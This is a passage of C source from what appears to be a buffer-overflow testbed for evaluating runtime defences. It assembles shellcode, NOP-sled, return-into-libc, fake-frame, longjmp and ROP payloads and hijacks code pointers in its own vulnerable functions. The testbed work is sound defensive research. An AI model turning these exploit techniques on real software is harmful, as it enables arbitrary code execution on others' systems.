		   payload.offset_to_fake_return_addr -
		   sizeof(long));  // the new old base ptr
	printf("*(long *)(*(long *)target_addr) = %p\n",
	       	*(long *)(*(long *)target_addr));
	printf("*(long *)(*(long *)(*(long *)target_addr)) = %p\n",
	       	*(long *)(*(long *)(*(long *)target_addr)));
	printf("*(long *)(*(long *)(*(long *)target_addr) + 4) = %p\n",
	       	*(long *)(*(long *)(*(long *)target_addr) + 4));
	printf("*(long *)(*(long *)(*(long *)target_addr) + 8) = %p\n",
	       	*(long *)(*(long *)(*(long *)target_addr) + 8));
	printf("*(long *)(*(long *)(*(long *)target_addr) + 12) = %p\n",
	       	*(long *)(*(long *)(*(long *)target_addr) + 12));
	printf("*(long *)(*(long *)(*(long *)target_addr) + 16) = %p\n",
	       	*(long *)(*(long *)(*(long *)target_addr) + 16));

	printf("Value written to target_addr = %p\n",
	  (long *)(buffer +        // start
		   payload.size -  // end
		   1 -             // null terminator
		   sizeof(long) -  // injected memory pointer
		   payload.offset_to_fake_return_addr -
		   sizeof(long))  // the new old base ptr
	       );
      } else {
	/* Note: These attack forms are considered impossible           */
	*(long *)(*(long *)target_addr) = (long)&system;
      }
      break;
    default:
      if(output_error_msg) {
	fprintf(stderr, "Error: Unknown choice of attack parameterB\n");
      }
      exit(1);
      break;
    }
    if(output_debug_info) {
      fprintf(output_stream, "*(long *)target_addr = %lx, *(long *)(*(long *)target_addr) = %lx\n\n", *(long *)target_addr, *(long *)(*(long *)target_addr));
    }
    /* @todo Write payload.overflow_ptr to overwritten pointer */
    break;
  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of technique\n");
    }
    exit(1);
    break;
  }    


  /*************************************************************/
  /* Ensure that program jumps to the overwritten code pointer */
  /* Send "/bin/sh" as parameter since it might be a return-   */
  /* into-libc attack calling system()                         */
  /*************************************************************/
  if(!output_debug_info) {
    // Only do this if not in debug mode since
    // an attack effectively destroys the memory
    // structures needed to inspect functionality
    switch(attack.code_ptr) {
    case RET_ADDR:
    case OLD_BASE_PTR:
      /* Just let the function carry on and eventually return */
      break;
    case FUNC_PTR_STACK_VAR:
	((int (*)(char *,int)) (*stack_func_ptr)) ("/tmp/rip-eval/f_xxxx",700);
      	break;

    case FUNC_PTR_STACK_PARAM:
	((int (*)(char *,int)) (*stack_func_ptr_param))("/tmp/rip-eval/f_xxxx",700);
	break;

    case FUNC_PTR_HEAP:
      // Get the function pointer stored in the overflown heap buffer
      heap_func_ptr = (void *)(*((long *)heap_func_ptr));
      ((int (*)(char *,int))heap_func_ptr)("/tmp/rip-eval/f_xxxx",700);
      break;

    case FUNC_PTR_BSS:
      ((int (*)(char *,int)) (*bss_func_ptr))("/tmp/rip-eval/f_xxxx",700);
      break;

    case FUNC_PTR_DATA:
	//NN
	if (contains_terminating_char(&data_func_ptr1))
      		((int (*)(char *,int)) (*data_func_ptr2))("/tmp/rip-eval/f_xxxx",700);
      	else
      		((int (*)(char *,int)) (*data_func_ptr1))("/tmp/rip-eval/f_xxxx",700);	
      break;
    case LONGJMP_BUF_STACK_VAR:
      longjmp(stack_jmp_buffer, 1);
      break;
    case LONGJMP_BUF_STACK_PARAM:
      longjmp(stack_jmp_buffer_param, 1);
      break;
    case LONGJMP_BUF_HEAP:
      longjmp(heap_jmp_buffer, 1);
      break;
    case LONGJMP_BUF_BSS:
      /* NN: Indirect jmping needs to be treated differently */
      if(attack.technique == DIRECT)
      	longjmp(bss_jmp_buffer, 1);
      else if (attack.technique == INDIRECT)
	longjmp(bss_jmp_buffer_indirect, 1);
      break;
    case LONGJMP_BUF_DATA:
      longjmp(data_jmp_buffer, 1);
      break;

    case STRUCT_FUNC_PTR_STACK:
	(*stack_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
	break;
  case STRUCT_FUNC_PTR_HEAP:
	(*heap_struct->func_ptr)("/tmp/rip-eval/f_xxxx",700);
	break;
  case STRUCT_FUNC_PTR_DATA:
	(*data_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
	break;
  case STRUCT_FUNC_PTR_BSS:
	(*bss_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
	break;


    default:
      if(output_error_msg) {
	fprintf(stderr, "Error: Unknown choice of code pointer\n");
      }
      exit(1);
      break;
    }
  }

  
  if(output_debug_info) {
    save_memory(mem_dump2, dump_start_addr, DEFAULT_DUMP_SIZE);
    printf("output_stream = %p, &output_stream 0 %p\n\n",
	   output_stream, &output_stream);
    print_three_memory_dumps(output_stream,
			     mem_dump1, mem_dump2, payload_dump,
			     DEFAULT_DUMP_SIZE);
    fflush(output_stream);
    if(output_error_msg) {
      fprintf(stderr, "Dumped memory to stream\n");
    }

    sleep(1);
  } /* DEBUG */
}


/*******************/
/* BUILD_PAYLOAD() */
/*******************/
boolean build_payload(CHARPAYLOAD *payload) {
  size_t size_shellcode, bytes_to_pad, i;
  char *shellcode, *temp_char_buffer, *temp_char_ptr;

  switch(attack.inject_param) {
  case INJECTED_CODE_NO_NOP:
    if(payload->size < (size_shellcode_nonop + sizeof(long))) {
      return FALSE;
    }
    size_shellcode = size_shellcode_nonop;
    shellcode = shellcode_nonop;
    break;
  case INJECTED_CODE_SIMPLE_NOP:
    if(payload->size < (size_shellcode_simplenop + sizeof(long))) {
      printf("Payload size problem..............................\n");
      return FALSE;
    }
    size_shellcode = size_shellcode_simplenop;
    shellcode = shellcode_simplenop;
    break;
  case INJECTED_CODE_POLY_NOP:
    if(payload->size < (size_shellcode_polynop + sizeof(long))) {
      return FALSE;
    }
    size_shellcode = size_shellcode_polynop;
    shellcode = shellcode_polynop;
    break;
  case CREATE_FILE:
    if(payload->size < (size_shellcode_createfile + sizeof(long))) {
      return FALSE;
    }
    size_shellcode = size_shellcode_createfile;
    shellcode = createfile_shellcode;
    break;
  case RETURN_INTO_LIBC:
    if(payload->size < sizeof(long)) {
      return FALSE;
    }
    size_shellcode = 0;
    shellcode = "dummy";
    break;

  //NN42: Experimental
  case RETURN_ORIENTED_PROGRAMMING: 
    size_shellcode = 0;
    shellcode = "dummy";
    break;

  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of attack parameter");
    }
    exit(1);
    break;
  }
 
  //at this point, shellcode points to the correct shellcode and shellcode size points
  //to the correct size
	

  /* Allocate payload buffer */

  payload->buffer = (char *)malloc(payload->size);
  if(payload->buffer == NULL) {
    perror("Unable to allocate payload buffer.");
    return FALSE;
  }
  /* Copy shellcode into payload buffer */
  memcpy(payload->buffer, shellcode, size_shellcode);

  /* Calculate number of bytes to pad with */
  /* size - shellcode - target address - null terminator */
  bytes_to_pad =
    (payload->size - size_shellcode - sizeof(long) - sizeof(char));

  /* Pad payload buffer with dummy bytes */
  memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);

  //NN
  fprintf(stderr,"\noverflow_ptr: %p\n",payload->overflow_ptr);


  /* *************************************** */
  /* Special case: Build fake longjmp buffer */
  /* *************************************** */
  if(attack.technique == DIRECT &&
     (attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
      attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
      attack.code_ptr == LONGJMP_BUF_HEAP ||
      attack.code_ptr == LONGJMP_BUF_BSS ||
      attack.code_ptr == LONGJMP_BUF_DATA)) {

    /* If we're aiming for a direct longjmp buffer attack we need to copy BX */
    /* SI, DI, BP, and SP from jmp_buffer to build a complete longjmp buffer */
    memcpy(&(payload->buffer[size_shellcode +
			     bytes_to_pad -
			     (5*sizeof(long))]),
	   payload->jmp_buffer,
	   5 * sizeof(long));


    // For attacks against a stack parameter we need to
    // copy the pointer to the parameter
    if(attack.code_ptr == LONGJMP_BUF_STACK_PARAM) {
      // Array parameters are passed on as pointers so we need to
      // include the correct pointer to the actual longjmp buffer
      // in the right place on the stack below the return address
      size_t offset_to_stack_jmp_buffer_param =
	((unsigned long)payload->jmp_buffer) -
	((unsigned long)payload->stack_jmp_buffer_param);
      
      // Copy the pointer to the longjmp buffer parameter
      // to the right place in the payload buffer
      memcpy(&(payload->buffer[size_shellcode +
			       bytes_to_pad -
			       (5*sizeof(long)) -
			       offset_to_stack_jmp_buffer_param]),
	     payload->stack_jmp_buffer_param,
	     sizeof(long));
    }

   //NN: Trying to make an actual system systemcall instead of sleep
    //NN: Overwriting the saved esp
    if(attack.inject_param == RETURN_INTO_LIBC){
	void *pr = fake_esp_jmpbuff + 12;
	memcpy(&(payload->buffer[size_shellcode + bytes_to_pad - 1*sizeof(long)]),&pr,sizeof(long));
	fprintf(stderr,"Changed esp register in payload\n");
    }

  }

  /* ************************************ */
  /* Special case: Build fake stack frame */
  /* ************************************ */
  if(attack.code_ptr == OLD_BASE_PTR) {

    // Set an offset for where in the payload padding
    // area to inject a fake stack frame with a
    // copied base pointer and a return address
    // pointing to attack code
    payload->offset_to_fake_return_addr = (8 * sizeof(long));

    if(attack.technique == DIRECT) {
      /* Insert fake return address after the fake old base pointer */
      memcpy(&(payload->buffer[size_shellcode +
			       bytes_to_pad -
			       payload->offset_to_fake_return_addr]),
	     &payload->overflow_ptr,
	     sizeof(long));

      /* Insert pointer to environment variable containing a          */
      /* "/bin/sh" parameter for return-into-libc attacks             */
      //NN42 Changed to creat
      temp_char_ptr = getenv("param_to_creat");
      memcpy(&(payload->buffer[size_shellcode +
			       bytes_to_pad -
			       payload->offset_to_fake_return_addr +
			       2*sizeof(long)]),
	     &temp_char_ptr,
	     sizeof(long));  

      //NN42 Adding permissions
      memcpy(&(payload->buffer[size_shellcode +
			       bytes_to_pad -
			       payload->offset_to_fake_return_addr +
			       3*sizeof(long)]),
	     &fake_esp_jmpbuff[14],
	     sizeof(long)); 


  

      // Extend the payload to cover the return address
      // The return address is not going to be changed
      // since the attack targets the old base pointer
      // but it's more robust to write the return address
      // in its correct place instead of corrupting it
      // with the terminating null char in the payload

      // Extend payload size
      payload->size += sizeof(long);
      // Allocate new payload buffer
      temp_char_buffer = (char *)malloc(payload->size);
      // Copy current payload to new payload buffer
      memcpy(temp_char_buffer, payload->buffer, payload->size);
      // Copy existing return address to new payload
      //      for(i = 1 ; i <= sizeof(long); i++) {
      memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
	     (payload->ptr_to_correct_return_addr),
	     sizeof(long));


      // Free the old payload buffer
      free(payload->buffer);
      // Set the new payload buffer
      payload->buffer = temp_char_buffer;

    } else if(attack.technique == INDIRECT) {
      /* Insert fake return address after the fake old base pointer */
      memcpy(&(payload->buffer[size_shellcode +
			       bytes_to_pad -
			       payload->offset_to_fake_return_addr]),
	     &payload->fake_return_addr,
	     sizeof(long));

      /* Insert pointer to environment variable containing a          */
      /* "/tmp/rip-eval/f_xxxx" parameter for return-into-libc attacks             */
      temp_char_ptr = getenv("param_to_creat");
      memcpy(&(payload->buffer[size_shellcode +
			       bytes_to_pad -
			       payload->offset_to_fake_return_addr +
			       sizeof(long)]),
	     &temp_char_ptr,
	     sizeof(long));

      memcpy(&(payload->buffer[size_shellcode +
			       bytes_to_pad -
			       payload->offset_to_fake_return_addr +
			       2*sizeof(long)]),
	     &temp_char_ptr,
	     sizeof(long));      

      //NN: Setting up the second parameter for the creat call, the file permissions
      memcpy(&(payload->buffer[size_shellcode +
			       bytes_to_pad -
			       payload->offset_to_fake_return_addr +
			       3*sizeof(long)]),
	     &fake_esp_jmpbuff[14],
	     sizeof(long));  

      /* Add the address to the direct or indirect target */
      
      memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
	     &payload->overflow_ptr,
	     sizeof(long));

    } else {
      if(output_error_msg) {
	fprintf(stderr, "Error: Unknown choice of attack parameter");
      }
      exit(1);
    }
  } else if(attack.technique == DIRECT && attack.code_ptr == RET_ADDR) {

    /* Extend the payload to cover two memory addresses beyond the  */
    /* return address and inject a pointer to environment variable  */
    /* containing a "/bin/sh" parameter for return-into-libc attacks*/

    if(attack.inject_param == RETURN_ORIENTED_PROGRAMMING){
	fprintf(stderr,"ROP Sledding....;)\n");

 	// Extend payload size
    	payload->size += (7 * sizeof(long));
    	// Allocate new payload buffer
    	temp_char_buffer = (char *)malloc(payload->size);
    	// Copy current payload to new payload buffer
    	memcpy(temp_char_buffer, payload->buffer, payload->size);
    	// Copy existing return address to new payload
    	memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
	   (payload->ptr_to_correct_return_addr),
	   sizeof(long));

    	free(payload->buffer);
    	// Set the new payload buffer
   	 payload->buffer = temp_char_buffer;

      //Overwriting Return address with address of gadget1  
      memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
	   &rop_sled,
	   7* sizeof(long));

     /*
     //Argument for 1st pop
      memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
	   &gadget1,
	   sizeof(long));
      */
    }
    else{

    // Extend payload size
    payload->size += (3 * sizeof(long));
    // Allocate new payload buffer
    temp_char_buffer = (char *)malloc(payload->size);
    // Copy current payload to new payload buffer
    memcpy(temp_char_buffer, payload->buffer, payload->size);
    // Copy existing return address to new payload
    memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
	   (payload->ptr_to_correct_return_addr),
	   sizeof(long));
    // Free the old payload buffer
    free(payload->buffer);
    // Set the new payload buffer
    payload->buffer = temp_char_buffer;
    
    /* Insert pointer to environment variable containing a          */
    /* "/bin/sh" parameter for return-into-libc attacks             */
    temp_char_ptr = getenv("param_to_creat"); // NN42
    memcpy(&(payload->buffer[payload->size -
			     5 -               // NULL terminator
			     sizeof(long)]),   // the injected parameter
	   &temp_char_ptr,
	   sizeof(long));

    
    //NN42: Inserting the permissions
    memcpy(&(payload->buffer[payload->size - 1 -
			     sizeof(long)]),   // the injected parameter
	   &fake_esp_jmpbuff[14],
	   sizeof(long));
     
    /* Add the address to the direct or indirect target */

    memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
	   &payload->overflow_ptr,
	   sizeof(long));
   }//Else of Non-return oriented programming closes

  } else {
    // Not a base pointer attack nor a direct attack against the ret
    /* Add the address to the direct or indirect target */

    memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
	   &payload->overflow_ptr,
	   sizeof(long));
  }

  /* If the payload happens to contain a null that null will */
  /* terminate all string functions so we try removing it    */
  if(!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)) {
    remove_nulls(payload->buffer, payload->size);
  }

  /* Finally, add the terminating null character at the end */
  memset((payload->buffer + payload->size - 1), '\0', 1);

  return TRUE;
}

void set_technique(char *choice) {
  if(strcmp(choice, opt_techniques[0]) == 0) {
    attack.technique = DIRECT;
  } else if(strcmp(choice, opt_techniques[1]) == 0) {
    attack.technique = INDIRECT;
  } else {
    fprintf(stderr, "Error: Unknown choice of technique \"%s\"\n",
	    choice);
  }
}

void set_inject_param(char *choice) {
  if(strcmp(choice, opt_inject_params[0]) == 0) {
    attack.inject_param = INJECTED_CODE_NO_NOP;
  } else if(strcmp(choice, opt_inject_params[1]) == 0) {
    attack.inject_param = INJECTED_CODE_SIMPLE_NOP;
  } else if(strcmp(choice, opt_inject_params[2]) == 0) {
    attack.inject_param = INJECTED_CODE_POLY_NOP;
  } else if(strcmp(choice, opt_inject_params[3]) == 0) {
    attack.inject_param = RETURN_INTO_LIBC;
  } else if(strcmp(choice, opt_inject_params[4]) == 0) {
    attack.inject_param = CREATE_FILE;
  } else if(strcmp(choice, opt_inject_params[5]) == 0) {
    attack.inject_param = RETURN_ORIENTED_PROGRAMMING;
  } else {
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of injection parameter \"%s\"\n",
	      choice);
    }
    exit(1);
  }
}

void set_code_ptr(char *choice) {
  if(strcmp(choice, opt_code_ptrs[0]) == 0) {
    attack.code_ptr = RET_ADDR;
  } else if(strcmp(choice, opt_code_ptrs[1]) == 0) {
    attack.code_ptr = OLD_BASE_PTR;
  } else if(strcmp(choice, opt_code_ptrs[2]) == 0) {
    attack.code_ptr = FUNC_PTR_STACK_VAR;
  } else if(strcmp(choice, opt_code_ptrs[3]) == 0) {
    attack.code_ptr = FUNC_PTR_STACK_PARAM;
  } else if(strcmp(choice, opt_code_ptrs[4]) == 0) {
    attack.code_ptr = FUNC_PTR_HEAP;
  } else if(strcmp(choice, opt_code_ptrs[5]) == 0) {
    attack.code_ptr = FUNC_PTR_BSS;
  } else if(strcmp(choice, opt_code_ptrs[6]) == 0) {
    attack.code_ptr = FUNC_PTR_DATA;
  } else if(strcmp(choice, opt_code_ptrs[7]) == 0) {
    attack.code_ptr = LONGJMP_BUF_STACK_VAR;
  } else if(strcmp(choice, opt_code_ptrs[8]) == 0) {
    attack.code_ptr = LONGJMP_BUF_STACK_PARAM;
  } else if(strcmp(choice, opt_code_ptrs[9]) == 0) {
    attack.code_ptr = LONGJMP_BUF_HEAP;
  } else if(strcmp(choice, opt_code_ptrs[10]) == 0) {
    attack.code_ptr = LONGJMP_BUF_BSS;
  } else if(strcmp(choice, opt_code_ptrs[11]) == 0) {
    attack.code_ptr = LONGJMP_BUF_DATA;
  } else if(strcmp(choice,opt_code_ptrs[12]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_STACK;
  } 
    else if(strcmp(choice,opt_code_ptrs[13]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_HEAP;
  } 
    else if(strcmp(choice,opt_code_ptrs[14]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_DATA;
  } 
    else if(strcmp(choice,opt_code_ptrs[15]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_BSS;
  } 

   else {
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of code pointer \"%s\"\n",
	      choice);
    }
    exit(1);
  }
}

void set_location(char *choice) {
  if(strcmp(choice, opt_locations[0]) == 0) {
    attack.location = STACK;
  } else if(strcmp(choice, opt_locations[1]) == 0) {
    attack.location = HEAP;
  } else if(strcmp(choice, opt_locations[2]) == 0) {
    attack.location = BSS;
  } else if(strcmp(choice, opt_locations[3]) == 0) {
    attack.location = DATA;
  } else {
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of memory location \"%s\"\n",
	      choice);
    }
    exit(1);
  }
}

void set_function(char *choice) {
  if(strcmp(choice, opt_funcs[0]) == 0) {
    attack.function = MEMCPY;
  } else if(strcmp(choice, opt_funcs[1]) == 0) {
    attack.function = STRCPY;
  } else if(strcmp(choice, opt_funcs[2]) == 0) {
    attack.function = STRNCPY;
  } else if(strcmp(choice, opt_funcs[3]) == 0) {
    attack.function = SPRINTF;
  } else if(strcmp(choice, opt_funcs[4]) == 0) {
    attack.function = SNPRINTF;
  } else if(strcmp(choice, opt_funcs[5]) == 0) {
    attack.function = STRCAT;
  } else if(strcmp(choice, opt_funcs[6]) == 0) {
    attack.function = STRNCAT;
  } else if(strcmp(choice, opt_funcs[7]) == 0) {
    attack.function = SSCANF;
  } else if(strcmp(choice, opt_funcs[8]) == 0) {
    attack.function = FSCANF;
  } else if(strcmp(choice, opt_funcs[9]) == 0) {
    attack.function = HOMEBREW;
  } else {
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of vulnerable function \"%s\"\n",
	      choice);
    }
    exit(1);
  }
}

boolean contains_terminating_char(unsigned long value) {
  size_t i;
  char temp;

  for(i = 0; i < sizeof(long); i++) {
    temp = (char)(value & (unsigned char)-1);
    if(temp == '\0' ||      /* NUL */
       temp == '\r' ||      /* Carriage return */
       temp == '\n' )      /* New line (or Line feed) */
       //temp == (char)0xff)  /* -1 */
      {
	return TRUE;
      }
    // CHAR_BIT declared in limits.h
    value >>= CHAR_BIT;
  }
  return FALSE;
}

void remove_all_terminating_chars(char *contents, size_t length) {
  size_t i;

  for(i = 0; i < length; i++) {
    if(contents[i] == '\0' ||      /* NUL */
       contents[i] == '\r' ||      /* Carriage return */
       contents[i] == '\n') {      /* New line (or Line feed) */
      contents[i]++;
    } else if(contents[i] == (char)0xff) {  /* -1 */
      contents[i]--;
    }
  }
}

void remove_nulls(char *contents, size_t length) {
  size_t i;

  for(i = 0; i < length; i++) {
    if(contents[i] == '\0')      /* NUL */
      contents[i]++;
  }
}


/* MEMORY DUMP FUNCTIONS */

void print_payload_info(FILE *stream, CHARPAYLOAD *payload) {
  switch(payload->inject_param) {
  case INJECTED_CODE_NO_NOP:
    fprintf(stream, "\nChar payload without NOP sled\n");
    break;
  case INJECTED_CODE_SIMPLE_NOP:
    fprintf(stream, "\nChar payload with simple NOP sled\n");
    break;
  case INJECTED_CODE_POLY_NOP:
    fprintf(stream, "\nChar payload with polymorphic NOP sled\n");
    break;
  case RETURN_INTO_LIBC:
    fprintf(stream, "\nChar payload aimed at return into libc\n");
    break;
  case CREATE_FILE:
    fprintf(stream, "\nChar payload aimed at creating a file in /tmp/rip-eval/\n");
    break;
  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of attack parameter");
    }
    exit(1);
    break;
  }

  fprintf(stream, "Buffer size set: %i\n\n", payload->size);
  //  printf("Actual buffer size: %i\n", sizeof(payload->buffer));
  //  print_memory(stream, payload->buffer, payload->size);
  //  fprintf(stream, "\n\n");
}

static char *pointer;  // Global to leave stack untouched

void print_memory(FILE *stream, char *start, size_t words) {
  for(pointer = start; pointer < (char *)(start + words); pointer += 4) {
    fprintf(stream, "%p: 0x%x\n", pointer, *(unsigned int*)pointer);
  }
}

static size_t iterator;

void save_memory(MEM_DUMP *dump, char *start, size_t size) {
  pointer = start;
  for(iterator = 0; iterator < size; iterator++) {
    snprintf(dump[iterator].address, HEX_STRING_SIZE,
	     "%p", pointer);
    snprintf(dump[iterator].value, HEX_STRING_SIZE,
	     "0x%x", *(unsigned int*)pointer);
    pointer += sizeof(long);
  }
}

void print_two_memory_dumps(FILE *stream,
			    MEM_DUMP *dump1,
			    MEM_DUMP *dump2,
			    size_t size) {
  fprintf(stream, "%-22s%-22s\n", "Memory dump 1", "Memory dump 2");
  fprintf(stream, "%-11s%-11s%-11s%-11s\n\n",
	  "Address", "Value", "Value", "Address");
  {
    size_t i;
    for(i = 0; i < size; i++) {
      fprintf(stream, "%-11s%-11s%-11s%-11s\n",
	      dump1[i].address, dump1[i].value,
	      dump2[i].value, dump2[i].address);
    }
  }
  fprintf(stream, "\n\n");
}

void print_three_memory_dumps(FILE *stream,
			      MEM_DUMP *dump1,
			      MEM_DUMP *dump2,
			      MEM_DUMP *dump3,
			      size_t size) {
  fprintf(stream, "%-22s%-22s%-22s\n",
	  "Memory dump 1", "Memory dump 2", "Memory dump 3");
  fprintf(stream, "%-11s%-11s%-11s%-11s%-11s%-11s\n",
	  "Address", "Value", "Value", "Address", "Value", "Address");
  {
    size_t i;
    for(i = 0; i < size; i++) {
      fprintf(stream, "%-11s%-11s%-11s%-11s%-11s%-11s\n",
	      dump1[i].address, dump1[i].value,
	      dump2[i].value, dump2[i].address,
	      dump3[i].value, dump3[i].address);
    }
  }
  fprintf(stream, "\n\n");
}

/*************************************/
/* Check for impossible attack forms */
/*************************************/
boolean is_attack_possible() {
  switch(attack.location) {
  case STACK:
    if((attack.technique == DIRECT) &&
       ((attack.code_ptr == FUNC_PTR_HEAP) ||
	(attack.code_ptr == FUNC_PTR_BSS) ||
	(attack.code_ptr == FUNC_PTR_DATA) ||
	(attack.code_ptr == LONGJMP_BUF_HEAP) ||
	(attack.code_ptr == LONGJMP_BUF_BSS) ||
	(attack.code_ptr == LONGJMP_BUF_DATA) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
      if(output_error_msg) {
	fprintf(stderr, "Error: Impossible to perform a direct attack on the stack into another memory segment.\n");
      }
      return FALSE;
    }
    break;
  case HEAP:
    if((attack.technique == DIRECT) &&
       ((attack.code_ptr == RET_ADDR) ||
	(attack.code_ptr == OLD_BASE_PTR) ||
	(attack.code_ptr == FUNC_PTR_STACK_VAR) ||
	(attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
	(attack.code_ptr == FUNC_PTR_BSS) ||
	(attack.code_ptr == FUNC_PTR_DATA) ||
	(attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
	(attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
	(attack.code_ptr == LONGJMP_BUF_BSS) ||
	(attack.code_ptr == LONGJMP_BUF_DATA) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_BSS)  )) {
      if(output_error_msg) {
	fprintf(stderr, "Error: Impossible perform a direct attack on the heap into another memory segment.\n");
      }
      return FALSE;
    }
    break;
  case BSS:
    if((attack.technique == DIRECT) &&
       ((attack.code_ptr == RET_ADDR) ||
	(attack.code_ptr == OLD_BASE_PTR) ||
	(attack.code_ptr == FUNC_PTR_STACK_VAR) ||
	(attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
	(attack.code_ptr == FUNC_PTR_HEAP) ||
	(attack.code_ptr == FUNC_PTR_DATA) ||
	(attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
	(attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
	(attack.code_ptr == LONGJMP_BUF_HEAP) ||
	(attack.code_ptr == LONGJMP_BUF_DATA) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_HEAP)  )) {
      if(output_error_msg) {
	fprintf(stderr, "Error: Impossible to peform a direct attack in the BSS segment into another memory segment.\n");
      }
      return FALSE;
    }
    break;
  case DATA:
    if((attack.technique == DIRECT) &&
       ((attack.code_ptr == RET_ADDR) ||
	(attack.code_ptr == OLD_BASE_PTR) ||
	(attack.code_ptr == FUNC_PTR_STACK_VAR) ||
	(attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
	(attack.code_ptr == FUNC_PTR_HEAP) ||
	(attack.code_ptr == FUNC_PTR_BSS) ||
	(attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
	(attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
	(attack.code_ptr == LONGJMP_BUF_HEAP) ||
	(attack.code_ptr == LONGJMP_BUF_BSS) ||

        (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
        (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
      if(output_error_msg) {
	fprintf(stderr, "Error: Impossible to perform a direct attack in the Data segment into another memory segment.\n");
      }


      return FALSE;
    }
    break;
  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of buffer location\n");
    }
    return FALSE;
  }

  // Indirect attacks doing return-into-libc are considered
  // impossible since the attacker cannot inject a parameter,
  // e.g. the parameter "/bin/sh" to system().
  // The exception to the rule is an attack against the old
  // base pointer we're the attacker injects a whole fake
  // stack frame.
  if(attack.technique == INDIRECT &&
     attack.inject_param == RETURN_INTO_LIBC &&
     attack.code_ptr != OLD_BASE_PTR) {
    if(output_error_msg) {
      fprintf(stderr, "Error: Impossible to perform an indirect return-into-libc attack since parameters for the libc function cannot be injected.\n");
    }
    return FALSE;
  }

  //NN For now only direct attacks to struct_func
  switch (attack.code_ptr){
    case STRUCT_FUNC_PTR_STACK:
    case STRUCT_FUNC_PTR_HEAP:
    case STRUCT_FUNC_PTR_DATA:
    case STRUCT_FUNC_PTR_BSS:
	if(attack.technique != DIRECT){
		fprintf(stderr,"Error: Impossible...for now at least :)\n");
		return FALSE;
	}
        break;
	
   default:
	break;  
 }
  if(attack.inject_param == RETURN_ORIENTED_PROGRAMMING && (attack.technique != DIRECT || attack.code_ptr != RET_ADDR)){
     fprintf(stderr,"Error: Impossible...for now at least :)\n");
     return FALSE;
  }

  return TRUE;
}

void homebrew_memcpy(void *dst, const void *src, size_t length) {
  char *d, *s;

  d = (char *)dst;
  s = (char *)src;

  while(length--) {
    *d++ = *s++;
  }
}

//NN: Dummy functions used to create gadgets for the ROP attack

void gadget1(int a, int b){
   int arthur,dent,j;
   arthur = a + b / 42;

   for(j=0;j<10;j++);
   //Gadget 1, locate at gardget1 + 62 bytes
   asm("nop"); //Using this to find it easier in dissas code
   asm("pop %eax"); //FFFFFFFF => 8
   asm("add $9, %eax");
   asm("ret");
   
   return;

}
void gadget2(int a, int b){
   int ford,prefect,j;
   ford = a + b / 43;
   //Gadget 1, locate at gadget2 + 62 bytes
   for(j=0;j<10;j++);
   asm("nop"); 
   asm("pop %ebx");
   asm("pop %ecx");  //FFFFFFFF => 448
   asm("add $449, %ecx");
   asm("ret");
   
   return;

}
int gadget3(int a, int b){
   int i,j;
   i = a + b / 33;

   for(j=0;j<10;j++);
   //Gadget3 starts here, located at gadget3 + 62 bytes
   asm("nop");
   asm("int $0x80");

  return 42;


}

